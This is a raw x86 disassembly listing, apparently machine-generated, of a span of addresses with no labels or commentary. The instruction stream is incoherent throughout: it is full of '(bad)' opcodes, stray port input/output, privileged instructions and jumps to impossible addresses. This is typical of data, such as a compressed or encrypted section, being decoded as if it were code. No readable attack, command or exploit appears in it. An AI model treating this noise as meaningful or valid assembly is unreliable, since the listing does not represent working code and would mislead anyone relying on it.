  421fe7:	pop    esi
  421fe8:	es aaa 
  421fea:	ret    
  421feb:	test   eax,0x9adaf6eb
  421ff0:	dec    ecx
  421ff2:	sbb    eax,0x549653ab
  421ff7:	mov    esi,0x460123f5
  421ffc:	sub    esi,DWORD PTR [ecx-0x4f4f977]
  422002:	pop    ebx
  422003:	enter  0x5221,0x87
  422007:	ja     0x421fd3
  422009:	jp     0x42207b
  42200b:	jb     0x422051
  42200d:	xor    eax,0x528534e6
  422012:	mov    BYTE PTR [ebx+0x4b],dl
  422015:	popa   
  422016:	pop    ss
  422017:	lea    ebp,[edx]
  422019:	stos   BYTE PTR es:[edi],al
  42201a:	add    al,BYTE PTR [ecx+ebx*1-0x69]
  42201e:	pop    ecx
  42201f:	scas   al,BYTE PTR es:[edi]
  422020:	arpl   WORD PTR [esi+eax*4],dx
  422023:	retf   0x291b
  422026:	js     0x422037
  422028:	xchg   edx,eax
  422029:	retf   
  42202a:	mov    ecx,DWORD PTR [ebx-0x5a]
  42202d:	pop    ss
  42202e:	sub    ch,BYTE PTR [ecx+0x79fd173]
  422034:	int3   
  422035:	and    edi,ecx
  422037:	loope  0x422083
  422039:	imul   dh
  42203b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42203c:	mov    eax,0x145d9fa
  422041:	retf   0x79ff
  422044:	test   BYTE PTR [edi+0x28],bl
  422047:	popa   
  422048:	jns    0x422021
  42204a:	gs cwde 
  42204c:	aad    0x3b
  42204e:	shl    ebx,1
  422050:	push   edi
  422051:	add    ecx,edi
  422053:	sub    ch,BYTE PTR [edx+ebp*2+0x63]
  422057:	pop    edx
  422058:	add    eax,0xecd34091
  42205d:	mov    ah,0x92
  42205f:	popa   
  422060:	(bad)  
  422061:	or     eax,0x5bc63cec
  422066:	cmp    eax,0x7349011
  42206b:	jae    0x4220c6
  42206d:	mov    cs,WORD PTR [eax+0x5f]
  422070:	cmp    BYTE PTR [ecx],bl
  422072:	sub    BYTE PTR [edi-0x30b6eec1],ch
  422078:	xchg   BYTE PTR [bp+di-0x57],dl
  42207c:	(bad)  
  42207d:	aad    0x35
  42207f:	fidivr DWORD PTR [ebp+0x5ebc4eab]
  422085:	out    0xd,eax
  422087:	pop    ss
  422088:	xchg   ebp,eax
  422089:	shl    DWORD PTR [edi-0x7e5b1834],cl
  42208f:	push   ds
  422090:	jo     0x4220e0
  422092:	push   ecx
  422093:	cdq    
  422094:	push   ss
  422095:	sub    ebp,0x321ea316
  42209b:	(bad)  
  42209c:	and    dh,cl
  42209e:	pop    ebp
  42209f:	pop    ds
  4220a0:	sbb    esp,DWORD PTR [edx]
  4220a2:	ja     0x42206d
  4220a4:	ret    0x950c
  4220a7:	add    BYTE PTR ds:0x168c0d78,0x28
  4220ae:	add    BYTE PTR [eax],al
  4220b0:	add    BYTE PTR [eax],al
  4220b2:	cmp    ecx,edi
  4220b4:	pop    ebx
  4220b5:	sub    ebx,ebx
  4220b7:	stos   DWORD PTR es:[edi],eax
  4220b8:	jns    0x4220b5
  4220ba:	dec    edx
  4220bb:	sub    bl,0xe9
  4220be:	loopne 0x422062
  4220c0:	cmp    BYTE PTR [edi],0x99
  4220c3:	call   0x0:0x4f40001
  4220ca:	push   ebp
  4220cb:	cmp    edx,edx
  4220cd:	or     BYTE PTR [ebp-0x9],dl
  4220d0:	cmp    cl,BYTE PTR [eax]
  4220d2:	push   esp
  4220d3:	sbb    eax,0xf3ca7a6f
  4220d8:	sbb    bl,bh
  4220da:	mov    dh,0xf8
  4220dc:	das    
  4220dd:	jmp    0x3e656f94
  4220e2:	and    al,0x3b
  4220e4:	repnz call 0x94e0:0xb0178aa
  4220ec:	mov    eax,0xb5877619
  4220f1:	cmp    edi,ebp
  4220f3:	pop    ss
  4220f4:	ret    
  4220f5:	rol    DWORD PTR [ebx],cl
  4220f7:	jnp    0x422081
  4220f9:	add    DWORD PTR [eax-0x637c2d5a],edi
  4220ff:	adc    ecx,DWORD PTR [edx+0x788efc95]
  422105:	sar    DWORD PTR [ebp-0x19],1
  422108:	scas   eax,DWORD PTR es:[edi]
  422109:	cdq    
  42210a:	or     DWORD PTR ds:0xc3318235,eax
  422110:	out    dx,al
  422111:	lds    ecx,FWORD PTR [edx+0x2c]
  422114:	sub    BYTE PTR [edx+0x5a],0x73
  422118:	aas    
  422119:	popf   
  42211a:	test   BYTE PTR ds:0xb9a2aea8,dl
  422120:	ror    BYTE PTR [edi],cl
  422122:	(bad)  
  422123:	jge    0x42212e
  422125:	add    al,0x3d
  422127:	in     al,dx
  422128:	pushf  
  422129:	in     eax,0x7
  42212b:	pop    ss
  42212c:	ja     0x422171
  42212e:	jnp    0x4220f9
  422130:	mov    ch,0xe6
  422132:	pop    eax
  422133:	push   bp
  422135:	rcr    edi,1
  422137:	retf   
  422138:	adc    al,0x7e
  42213a:	sbb    ch,al
  42213c:	jmp    0x422181
  42213e:	inc    esp
  42213f:	mov    al,ds:0xdf227582
  422144:	cwde   
  422145:	pushf  
  422146:	(bad)  
  422147:	call   0x7ef5:0x2541064f
  42214e:	out    dx,al
  42214f:	and    bh,BYTE PTR [eax]
  422151:	dec    DWORD PTR [ecx+0x66dc03bc]
  422157:	addr16 mov ch,0x97
  42215a:	cs cwde 
  42215c:	daa    
  42215d:	adc    al,0x86
  42215f:	fst    QWORD PTR [ebx-0x7d]
  422162:	sub    DWORD PTR [ecx],eax
  422164:	cs dec edx
  422166:	pushf  
  422167:	jb     0xc8891be2
  42216d:	cmp    eax,DWORD PTR [eax]
  42216f:	xor    al,0xb6
  422171:	(bad)  
  422172:	dec    edi
  422173:	mov    esi,0x461bbd74
  422178:	retf   
  422179:	xchg   edx,eax
  42217a:	inc    ebp
  42217b:	jg     0x42212f
  42217d:	shr    BYTE PTR [ebp+0x26514be6],cl
  422183:	jbe    0x4221f6
  422185:	or     ah,BYTE PTR [esi]
  422187:	dec    eax
  422188:	je     0x4221f9
  42218a:	mov    cl,al
  42218c:	test   al,0x7d
  42218f:	nop
  422190:	call   0x7914bf64
  422195:	add    al,0x9f
  422197:	cdq    
  422198:	mov    ecx,0x825678e6
  42219d:	jmp    0x10d6:0x48cd1fd1
  4221a4:	adc    dl,BYTE PTR [ebx-0x7]
  4221a7:	retf   
  4221a8:	mov    WORD PTR ss:[ebx-0x539aa63d],cs
  4221af:	push   edx
  4221b0:	add    ecx,ebp
  4221b2:	and    DWORD PTR [edi+ecx*1-0x25],esp
  4221b6:	and    al,0xe
  4221b8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4221b9:	mov    esp,ebx
  4221bb:	les    ebp,FWORD PTR [edi-0x3f]
  4221be:	jns    0x422224
  4221c0:	stos   BYTE PTR es:[edi],al
  4221c1:	shl    ebx,1
  4221c3:	fs add BYTE PTR ss:[edi+eax*2+0x9],al
  4221c9:	aad    0x2e
  4221cb:	lea    edx,[esi]
  4221cd:	dec    esp
  4221ce:	aaa    
  4221cf:	dec    ebx
  4221d0:	mov    al,0xb5
  4221d2:	outs   dx,DWORD PTR ss:[esi]
  4221d4:	data16 lock or dh,BYTE PTR [edi+eiz*8+0x3694dd14]
  4221dd:	mov    BYTE PTR [eax+eiz*8+0xf],bh
  4221e1:	sahf   
  4221e2:	xor    al,0x1d
  4221e4:	mov    ecx,0xbee4827
  4221e9:	mov    eax,ds:0x54b21ad
  4221ee:	das    
  4221ef:	test   eax,0x7c755e23
  4221f4:	pop    es
  4221f5:	shr    BYTE PTR [edi+0x26f5bb37],1
  4221fb:	bound  eax,QWORD PTR es:[ecx+0x79]
  4221ff:	or     ebx,DWORD PTR [edx-0x472cd45e]
  422205:	(bad)  
  422207:	arpl   WORD PTR [ebx+edi*1+0x1a],si
  42220b:	lahf   
  42220c:	cmp    eax,edx
  42220e:	sub    DWORD PTR [ebx-0x2e],ebx
  422211:	pop    edx
  422212:	sbb    BYTE PTR [esi+0x58],cl
  422215:	sbb    dh,BYTE PTR [edi]
  422217:	ins    BYTE PTR es:[edi],dx
  422218:	ds mov edi,0xa1e25792
  42221e:	outs   dx,BYTE PTR ds:[esi]
  42221f:	mov    dh,0xe5
  422221:	pop    eax
  422222:	add    ebp,DWORD PTR [eax+0x19]
  422225:	xchg   ebp,eax
  422226:	ds or  dh,cl
  422229:	scas   eax,DWORD PTR es:[edi]
  42222a:	mov    WORD PTR [edi-0x31],fs
  42222d:	sahf   
  42222e:	adc    edx,DWORD PTR [edi-0x9dc724]
  422234:	push   0xffffffcb
  422236:	leave  
  422237:	pusha  
  422238:	push   0xffffffa6
  42223a:	inc    ebx
  42223b:	or     al,0xb8
  42223d:	xor    edx,DWORD PTR ds:[edx+0x4d]
  422241:	data16 cld 
  422243:	call   0x6a15957
  422248:	adc    edi,DWORD PTR [edx+0x1fc423af]
  42224e:	imul   esp,DWORD PTR [ebp-0x7aeccb32],0x5a639084
  422258:	inc    cl
  42225a:	icebp  
  42225b:	lods   al,BYTE PTR ds:[esi]
  42225c:	in     eax,0x80
  42225e:	mov    al,ds:0x74e7a7b4
  422263:	mov    bh,0xc9
  422265:	mov    ebp,0x2b4ee74a
  42226a:	pop    esi
  42226b:	mov    ebx,0xfe234af8
  422270:	push   eax
  422271:	xchg   DWORD PTR [edi-0x36],ecx
  422274:	ds pushf 
  422276:	push   eax
  422277:	push   ss
  422278:	sbb    al,0xd1
  42227a:	xchg   esp,eax
  42227b:	jnp    0x42225b
  42227d:	jno    0x42221e
  42227f:	int3   
  422280:	into   
  422281:	ja     0x42222f
  422283:	rcr    al,cl
  422285:	test   cl,ch
  422287:	stos   DWORD PTR es:[edi],eax
  422288:	and    DWORD PTR [ebx+0x35f1f31a],ebx
  42228e:	xchg   edi,eax
  42228f:	inc    esp
  422290:	sbb    al,0x4e
  422292:	les    eax,FWORD PTR [ecx-0x3e]
  422295:	mov    ecx,0xe10b7e01
  42229a:	repz mov esi,edx
  42229d:	add    cl,BYTE PTR ds:0xedbe55a2
  4222a3:	mov    ss,eax
  4222a5:	int3   
  4222a6:	adc    al,0xab
  4222a8:	test   eax,0xb69bd321
  4222ad:	add    ebx,ebx
  4222af:	or     eax,0x104b5048
  4222b4:	and    al,0xf2
  4222b6:	add    BYTE PTR [eax+0x54],0x59
  4222ba:	loope  0x4222ee
  4222bc:	out    0xba,eax
  4222be:	clc    
  4222bf:	xor    eax,0x698a2dbe
  4222c4:	cs or  eax,0x7b8c811b
  4222ca:	outs   dx,DWORD PTR ds:[esi]
  4222cb:	lods   eax,DWORD PTR ds:[esi]
  4222cc:	out    0xa7,al
  4222ce:	imul   ebx,DWORD PTR [ebx-0x76d899ca],0x57
  4222d5:	(bad)  
  4222d6:	loop   0x42231b
  4222d8:	xchg   ebx,eax
  4222d9:	daa    
  4222da:	jle    0x4222d3
  4222dc:	inc    esi
  4222dd:	fimul  WORD PTR [esi+0x285cbf2f]
  4222e3:	stos   DWORD PTR es:[edi],eax
  4222e4:	test   eax,0x20ada1e5
  4222e9:	adc    DWORD PTR [edi+0x12],edi
  4222ec:	or     cl,dh
  4222ee:	sub    bl,BYTE PTR [ebx]
  4222f0:	and    BYTE PTR [edi+0x528c3240],bl
  4222f6:	fild   QWORD PTR [edi+0x7c]
  4222f9:	test   ebx,eax
  4222fb:	or     al,0xff
  4222fd:	dec    eax
  4222fe:	and    DWORD PTR [esi-0x4b949465],esi
  422304:	call   0x85ba641f
  422309:	into   
  42230a:	shl    edi,0xc0
  42230d:	rcr    BYTE PTR [edi+ebp*8],0xb3
  422311:	shl    DWORD PTR [edx+0x70],cl
  422314:	das    
  422315:	out    0x8,al
  422317:	cmc    
  422318:	sar    BYTE PTR [esi-0x71],0xe0
  42231c:	adc    BYTE PTR [eiz*4+0x1415a873],al
  422323:	mov    ch,0xc4
  422325:	inc    bh
  422327:	(bad)  
  422328:	pusha  
  422329:	add    ah,BYTE PTR [edi]
  42232b:	sub    esp,DWORD PTR [esi+0x341ac044]
  422331:	jl     0x42232a
  422333:	cmp    DWORD PTR [edi],ebp
  422335:	stos   BYTE PTR es:[edi],al
  422336:	adc    ebx,DWORD PTR [ebx-0x55]
  422339:	cmc    
  42233a:	pop    ebp
  42233b:	shl    ch,0xeb
  42233e:	cld    
  42233f:	push   ebp
  422340:	cmp    BYTE PTR [eax+0x2efaec9e],dh
  422346:	lock sub eax,0x9782b103
  42234c:	push   es
  42234d:	cmp    al,0x6f
  42234f:	push   esi
  422350:	cmp    eax,0xd9a5d1c3
  422355:	ja     0x422367
  422357:	stc    
  422358:	mov    BYTE PTR [ebx+0x7d],bh
  42235b:	sbb    BYTE PTR [edi+0x40],dh
  42235e:	cmp    ebp,DWORD PTR [esi-0x45]
  422361:	jecxz  0x422335
  422363:	cmp    ah,BYTE PTR [edx+edx*1]
  422366:	gs pop ebx
  422368:	adc    edi,DWORD PTR [esi+0x1dc4dea1]
  42236e:	fnstsw WORD PTR [edi-0x4d]
  422371:	inc    esi
  422372:	test   eax,0x75cde8ea
  422377:	sti    
  422378:	cmp    BYTE PTR [esi],0x6e
  42237b:	and    al,0xc1
  42237d:	mov    eax,ds:0x6bb79be1
  422382:	push   0x16ac26a9
  422387:	dec    edi
  422388:	inc    esi
  422389:	mov    ebx,0xa91b31d
  42238e:	cdq    
  42238f:	(bad)  
  422391:	adc    bh,BYTE PTR [ebx-0x1255a23]
  422397:	pop    ecx
  422398:	scas   al,BYTE PTR es:[edi]
  422399:	adc    eax,0xaa2575b2
  42239e:	push   ebp
  42239f:	out    0x44,al
  4223a1:	xchg   esp,eax
  4223a2:	test   BYTE PTR [esi-0x5cd4affb],bh
  4223a8:	xchg   ecx,eax
  4223a9:	dec    ecx
  4223aa:	sub    al,BYTE PTR [edx]
  4223ac:	pushf  
  4223ad:	dec    ecx
  4223ae:	sbb    ebp,DWORD PTR ds:0xb2b3d6b3
  4223b4:	mov    al,BYTE PTR ds:[ebx-0x60895964]
  4223bb:	ficom  WORD PTR [esi+0x19d164fc]
  4223c1:	xchg   ebp,eax
  4223c2:	pop    ebp
  4223c3:	scas   al,BYTE PTR es:[edi]
  4223c4:	enter  0xda42,0x32
  4223c8:	mov    bh,0x81
  4223ca:	mov    ds:0xdee5b5e6,eax
  4223cf:	xchg   esi,eax
  4223d0:	out    dx,al
  4223d1:	pop    esp
  4223d2:	fsubp  st(1),st
  4223d4:	fld    TBYTE PTR ds:0x19eebebc
  4223da:	push   ebp
  4223db:	mov    cl,0x1f
  4223dd:	adc    al,0x2d
  4223df:	xchg   edi,eax
  4223e0:	add    eax,0x6f880c32
  4223e5:	js     0x4223d7
  4223e7:	xor    BYTE PTR gs:[edi+0x308b47e1],0x8b
  4223ef:	or     al,0xed
  4223f1:	pop    edi
  4223f2:	mov    ah,0x76
  4223f4:	jae    0x4223ad
  4223f6:	shl    DWORD PTR [esi],cl
  4223f8:	xor    BYTE PTR ds:0xb8c1aafd,dl
  4223fe:	loopne 0x4223b7
  422400:	cmp    ebx,ebx
  422402:	cmp    bh,BYTE PTR ds:[ecx+0x5f]
  422406:	outs   dx,DWORD PTR cs:[esi]
  422408:	dec    esp
  422409:	xchg   ah,bl
  42240b:	sbb    edi,DWORD PTR [ebx-0x20]
  42240e:	lock push ds
  422410:	mov    ds:0x8605f773,eax
  422415:	adc    eax,0x4e2d9da0
  42241a:	int    0x4e
  42241c:	sbb    ebx,esi
  42241e:	mov    ds:0x8e3d0f6d,eax
  422423:	mov    bh,0x45
  422425:	cmp    edx,DWORD PTR [eax+0x49bd04f3]
  42242b:	mov    edi,edi
  42242d:	aad    0x56
  42242f:	rol    esp,0x8d
  422432:	mov    esp,DWORD PTR [edi]
  422434:	in     al,dx
  422435:	push   0xe
  422437:	and    BYTE PTR [edi-0x28785777],ah
  42243d:	adc    BYTE PTR [ecx-0x71],cl
  422440:	adc    dh,BYTE PTR [esi]
  422442:	sub    ecx,ecx
  422444:	(bad)  
  422445:	fdivr  QWORD PTR [edx+0x35b37c84]
  42244b:	mov    esi,0x19db5f4e
  422450:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  422451:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  422452:	icebp  
  422453:	imul   ebp,DWORD PTR [eax],0xffffffa4
  422456:	repz add BYTE PTR [ebx],0x8
  42245a:	dec    esi
  42245b:	and    eax,0x1b040e6a
  422460:	ins    DWORD PTR es:[edi],dx
  422461:	xchg   edi,eax
  422462:	shl    edx,1
  422464:	test   bh,dh
  422466:	cs pop es
  422468:	dec    eax
  422469:	addr16 push ebx
  42246b:	sar    DWORD PTR [ecx-0x58783835],cl
  422471:	cmp    DWORD PTR [ecx],ebx
  422473:	mov    esp,0x4600242f
  422478:	lods   eax,DWORD PTR ds:[esi]
  422479:	js     0x422416
  42247b:	jno    0x422402
  42247d:	or     al,0x58
  42247f:	sub    bl,BYTE PTR [edi+ebp*1-0x28f97136]
  422486:	aas    
  422487:	jg     0x422433
  422489:	push   edx
  42248a:	shl    BYTE PTR [edi],1
  42248c:	fidiv  WORD PTR [eax]
  42248e:	in     eax,0xae
  422490:	cs jl  0x4224a8
  422493:	pop    ss
  422494:	stos   BYTE PTR es:[edi],al
  422495:	pop    ebp
  422496:	mov    esi,0x62f41f86
  42249b:	adc    DWORD PTR [edx-0x238ce90c],esi
  4224a1:	stc    
  4224a2:	imul   eax,DWORD PTR [ebx-0x4f],0x11
  4224a6:	push   ss
  4224a7:	and    ch,dh
  4224a9:	and    al,0x56
  4224ab:	ret    
  4224ac:	loop   0x4224ef
  4224ae:	mov    WORD PTR [edi-0x7aa19945],cs
  4224b4:	xor    eax,0x322b3c7
  4224b9:	rol    DWORD PTR [esi],cl
  4224bb:	rol    BYTE PTR [edx+0x79199746],1
  4224c1:	pop    DWORD PTR [edx+0xa]
  4224c4:	add    esp,DWORD PTR [edx]
  4224c6:	repnz xor ah,BYTE PTR [esi+0x4ec41212]
  4224cd:	adc    al,0x7f
  4224cf:	pop    edi
  4224d0:	test   DWORD PTR [ebp-0x38],edi
  4224d3:	xor    dl,BYTE PTR [edi]
  4224d5:	sub    DWORD PTR [esi+0x4c],eax
  4224d8:	aad    0x6d
  4224da:	pop    eax
  4224db:	(bad)  
  4224dc:	scas   al,BYTE PTR es:[edi]
  4224dd:	xchg   DWORD PTR [edi+ebx*1+0x6f],ebp
  4224e1:	and    DWORD PTR [ecx],eax
  4224e3:	imul   esp,DWORD PTR [ebp+0x127a28a],0x7a
  4224ea:	cs ret 
  4224ec:	and    dl,BYTE PTR [ebp+0x388103e0]
  4224f2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4224f3:	pop    ss
  4224f4:	pop    ecx
  4224f5:	fnstsw WORD PTR ds:0x3110d51c
  4224fb:	cmp    edx,DWORD PTR [esi+0x0]
  4224fe:	inc    edx
  4224ff:	xchg   edx,eax
  422500:	sbb    BYTE PTR [edi+0x56],dl
  422503:	loope  0x42250c
  422505:	js     0x4224f4
  422507:	cmc    
  422508:	fmulp  st(0),st
  42250a:	cmp    al,0xc7
  42250c:	xor    al,0x64
  42250e:	gs fcmovnbe st,st(5)
  422511:	std    
  422512:	in     eax,0xb8
  422514:	push   ecx
  422515:	xchg   ah,cl
  422517:	xor    DWORD PTR [edx+0x5bd49918],0xae42f796
  422521:	sub    DWORD PTR [ebx-0x14],ebx
  422524:	ja     0x422517
  422526:	inc    edi
  422527:	adc    DWORD PTR ds:0x4c375bd6,ebx
  42252d:	dec    ecx
  42252e:	clc    
  42252f:	leave  
  422530:	jmp    0x5d085b98
  422535:	aaa    
  422536:	xor    BYTE PTR [ecx+0x40],dh
  422539:	mov    esp,0xff5b6a67
  42253e:	rol    DWORD PTR [ebp-0x35ad57c6],cl
  422544:	sub    bl,BYTE PTR [eax+ecx*4-0x25735396]
  42254b:	fild   DWORD PTR [edi+0x1ddbcdf7]
  422551:	jno    0x4224d9
  422553:	in     eax,0xca
  422555:	in     eax,dx
  422556:	or     esp,ecx
  422558:	push   eax
  422559:	or     al,0xc8
  42255b:	mov    esp,0xb4af6f8f
  422560:	push   ebp
  422561:	pop    esp
  422562:	sbb    eax,0xf2653b00
  422567:	push   cs
  422568:	stc    
  422569:	imul   ecx,DWORD PTR [esi],0x33
  42256c:	xor    al,0x5b
  42256e:	and    eax,0x3b448bce
  422573:	xor    BYTE PTR [ebp+0x33],0x24
  422577:	inc    ebp
  422578:	retf   0xa424
  42257b:	clc    
  42257c:	ins    BYTE PTR es:[edi],dx
  42257d:	xor    ah,BYTE PTR ds:0xfa43c915
  422583:	xor    cl,BYTE PTR [eax-0x51]
  422586:	imul   edx,DWORD PTR [esi],0x41b1be14
  42258c:	in     al,dx
  42258d:	or     eax,0x83474de4
  422592:	sti    
  422593:	in     eax,dx
  422594:	mov    al,0x48
  422596:	or     al,0xa7
  422598:	ins    DWORD PTR es:[edi],dx
  422599:	mov    dh,0x95
  42259b:	inc    BYTE PTR [ebp+0x3275a9cb]
  4225a1:	pop    ebp
  4225a2:	je     0x42253c
  4225a4:	out    dx,eax
  4225a5:	add    eax,0xf87dcd0a
  4225aa:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4225ab:	(bad)  
  4225ac:	sbb    DWORD PTR [ebx+0x4c],ebx
  4225af:	dec    esi
  4225b0:	pop    esp
  4225b1:	adc    ecx,ebx
  4225b3:	mov    esi,0x12124797
  4225b8:	push   0xffffff85
  4225ba:	pusha  
  4225bb:	xchg   DWORD PTR [ecx+0xc8],ecx
  4225c1:	add    dl,cl
  4225c3:	adc    al,0x69
  4225c5:	dec    ecx
  4225c6:	(bad)  
  4225c7:	jge    0x4225b3
  4225c9:	xchg   edi,eax
  4225ca:	outs   dx,DWORD PTR ds:[esi]
  4225cb:	jge    0x422555
  4225cd:	call   0x9f8d:0x44c35a28
  4225d4:	add    DWORD PTR [eax],eax
  4225d6:	hlt    
  4225d7:	add    al,0x0
  4225d9:	add    BYTE PTR [ebx-0xfc60345],cl
  4225df:	aaa    
  4225e0:	cmp    DWORD PTR [eax+0x34e6a247],ebp
  4225e6:	in     al,dx
  4225e7:	repnz mov al,ds:0x156aeafe
  4225ed:	mov    cl,bl
  4225ef:	iret   
  4225f0:	or     bh,ch
  4225f2:	(bad)  
  4225f3:	sbb    bl,dl
  4225f5:	push   edi
  4225f6:	std    
  4225f7:	inc    esp
  4225f8:	jl     0x4225e5
  4225fa:	(bad)  
  4225fb:	lds    edx,FWORD PTR [esp+eiz*2+0x5d55c6a1]
  422602:	sbb    eax,0x8062137b
  422607:	repnz dec edi
  422609:	jp     0x422651
  42260b:	inc    edx
  42260c:	jae    0x42266c
  42260e:	loop   0x4225e8
  422610:	push   eax
  422611:	pop    edx
  422612:	pop    esp
  422613:	push   0x5a
  422615:	ins    DWORD PTR es:[edi],dx
  422616:	and    ch,BYTE PTR [eax+0x17]
  422619:	dec    esi
  42261a:	int    0x77
  42261c:	mov    ecx,ds
  42261e:	ins    BYTE PTR es:[edi],dx
  42261f:	mov    cs,WORD PTR [eax+0x3]
  422622:	xchg   DWORD PTR [ecx+0x17],eax
  422625:	sahf   
  422626:	cld    
  422627:	jbe    0x42266a
  422629:	fwait
  42262a:	(bad)  
  42262b:	call   0x8101:0x5ce27e51
  422632:	fwait
  422633:	add    DWORD PTR [esi-0x3a],0x35eb9bc7
  42263a:	div    esi
  42263c:	pop    es
  42263d:	sub    ch,BYTE PTR ds:0xea958ee5
  422643:	mov    esi,0x5cf8ad9d
  422648:	mov    WORD PTR [ebp+0x48],fs
  42264b:	adc    ch,bh
  42264d:	adc    BYTE PTR [ebx+edi*2-0x1e],dh
  422651:	jmp    0x422679
  422653:	adc    al,0x6b
  422655:	in     al,dx
  422656:	aas    
  422657:	xlat   BYTE PTR ds:[ebx]
  422658:	aas    
  422659:	rsqrtps xmm2,xmm6
  42265c:	pop    eax
  42265d:	mov    esi,0xae8b9fbb
  422662:	dec    esi
  422663:	in     al,0x9d
  422665:	add    BYTE PTR [eax-0x481d8c6f],al
  42266b:	xor    ah,al
  42266d:	lods   al,BYTE PTR ds:[esi]
  42266e:	(bad)  
  42266f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  422670:	inc    edx
  422671:	icebp  
  422672:	and    BYTE PTR [edi+0x5d],al
  422675:	aas    
  422676:	push   ss
  422677:	or     al,0x98
  422679:	xchg   edx,eax
  42267a:	inc    ecx
  42267b:	push   ebx
  42267c:	aam    0x77
  42267e:	xchg   ebp,eax
  42267f:	push   ebx
  422680:	loopne 0x4226a6
  422682:	scas   al,BYTE PTR es:[edi]
  422683:	loop   0x4226d4
  422685:	add    DWORD PTR [bx],esp
  422688:	adc    DWORD PTR [eax-0x1f530bd9],ebp
  42268e:	mov    ch,BYTE PTR [edx]
  422690:	mov    eax,ds:0xfc5b1234
  422695:	and    al,0x28
  422697:	js     0x422669
  422699:	(bad)  
  42269a:	fdiv   QWORD PTR [edx+0x44]
  42269d:	adc    DWORD PTR [ebx-0x6ccf9c53],0xa8f22cfa
  4226a7:	test   al,0xe6
  4226a9:	pop    ebx
  4226aa:	push   ss
  4226ab:	xor    dl,0x52
  4226ae:	dec    BYTE PTR [esp+ebp*4+0x45]
  4226b2:	je     0x4226b8
  4226b4:	shl    DWORD PTR [edx-0x6c],1
  4226b7:	mov    edi,0x8a9cb52f
  4226bc:	les    edi,FWORD PTR [esi-0x8]
  4226bf:	ins    DWORD PTR es:[edi],dx
  4226c0:	icebp  
  4226c1:	pop    es
  4226c2:	mov    dh,0xee
  4226c4:	repz in eax,0x48
  4226c7:	dec    edx
  4226c8:	std    
  4226c9:	dec    ebp
  4226ca:	jp     0x4226be
  4226cc:	sub    ebp,DWORD PTR [ecx]
  4226ce:	mov    dh,0x1e
  4226d0:	push   ss
  4226d1:	push   0x5264f9b3
  4226d6:	loop   0x422747
  4226d8:	leave  
  4226d9:	(bad)  
  4226da:	pop    edi
  4226db:	push   ebx
  4226dc:	ret    
  4226dd:	xor    al,0xac
  4226df:	xor    DWORD PTR [edi+0x46],esi
  4226e2:	test   al,0xc7
  4226e4:	(bad)
  4226e8:	sub    eax,0x923c765a
  4226ed:	pop    ss
  4226ee:	jb     0x4226c5
  4226f0:	cmp    bh,BYTE PTR [edx-0x2c2581f4]
  4226f6:	fidiv  DWORD PTR [edx+esi*4-0x20]
  4226fa:	data16 jp 0x422711
  4226fd:	mov    ebx,0x47107ba2
  422702:	dec    edx
  422703:	popa   
  422704:	enter  0xa56f,0x2
  422708:	es call 0x38d8379e
  42270e:	jg     0x4226fd
  422710:	sbb    DWORD PTR [eax],edi
  422712:	ins    BYTE PTR es:[edi],dx
  422713:	sbb    BYTE PTR [ebx-0x4f203e07],0xf7
  42271a:	test   al,0x5c
  42271c:	scas   eax,DWORD PTR es:[edi]
  42271d:	push   ebx
  42271e:	jmp    0xafaef6ec
  422723:	pop    edx
  422724:	inc    ecx
  422725:	mov    ah,0xf
  422727:	push   es
  422728:	addr16 mov ch,0x2c
  42272b:	test   eax,0xf684b3d8
  422730:	out    0xd,eax
  422732:	push   edx
  422733:	jb     0x422703
  422735:	mul    DWORD PTR [ebx]
  422737:	jp     0x42279a
  422739:	and    ah,dl
  42273b:	aas    
  42273c:	xchg   ebx,eax
  42273d:	out    0xd1,al
  42273f:	pop    esp
  422740:	cdq    
  422741:	push   ds
  422742:	jae    0x422732
  422744:	outs   dx,DWORD PTR ds:[esi]
  422745:	gs addr16 aam 0xe7
  422749:	add    al,0x25
  42274b:	out    0xb5,al
  42274d:	mov    cl,0x67
  42274f:	jge    0x422785
  422751:	out    dx,eax
  422752:	mov    edi,DWORD PTR [ebp-0x6d710989]
  422758:	or     eax,ebp
  42275a:	sbb    dl,dl
  42275c:	or     eax,0x33915bdf
  422761:	xchg   edi,eax
  422762:	sub    ch,BYTE PTR [eax+0xf384637]
  422768:	or     al,0x66
  42276a:	jbe    0x42271f
  42276c:	fcmovb st,st(6)
  42276e:	add    edx,eax
  422770:	add    al,BYTE PTR [ecx+eax*2-0xf7fac84]
  422777:	push   0x27d0012a
  42277c:	add    edi,0x46
  42277f:	inc    esi
  422780:	cwde   
  422781:	int    0xdc
  422783:	xchg   ebx,eax
  422784:	rcl    esp,cl
  422786:	pop    ds
  422787:	jmp    0x422808
  422789:	cdq    
  42278a:	push   ebp
  42278b:	out    0x82,eax
  42278d:	test   ecx,ecx
  42278f:	sbb    BYTE PTR [ecx],0xa4
  422792:	rcl    dl,1
  422794:	mov    ecx,edi
  422796:	(bad)  
  422797:	iret   
  422798:	xchg   edi,eax
  422799:	push   0x75
  42279b:	aad    0xd9
  42279d:	pop    edi
  42279e:	xor    eax,0x254b7fa2
  4227a3:	mov    WORD PTR [edx+0x546bad89],ss
  4227a9:	jp     0x4227f6
  4227ab:	mov    al,ds:0x733457a8
  4227b0:	aam    0xc
  4227b2:	sub    ch,BYTE PTR [ecx-0x1d]
  4227b5:	push   ss
  4227b6:	sbb    eax,0x78730d84
  4227bb:	loopne 0x4227b4
  4227bd:	jle    0x422800
  4227bf:	pop    edi
  4227c0:	gs stc 
  4227c2:	scas   al,BYTE PTR es:[edi]
  4227c3:	add    eax,0x86eb5bbf
  4227c8:	je     0x4227f4
  4227ca:	add    BYTE PTR [esi+0x1c],dh
  4227cd:	xor    al,0x2d
  4227cf:	in     al,dx
  4227d0:	in     eax,0xf5
  4227d2:	xor    dl,BYTE PTR [eax+0x1]
  4227d5:	leave  
  4227d6:	or     bh,bl
  4227d8:	push   ds
  4227d9:	mov    ebx,0x44124419
  4227de:	les    edi,FWORD PTR [edi]
  4227e0:	mov    edx,0xeb37a444
  4227e5:	sub    eax,0x6736b4e
  4227ea:	aas    
  4227eb:	std    
  4227ec:	push   0x575624fe
  4227f1:	pop    es
  4227f2:	pop    ebp
  4227f3:	cld    
  4227f4:	icebp  
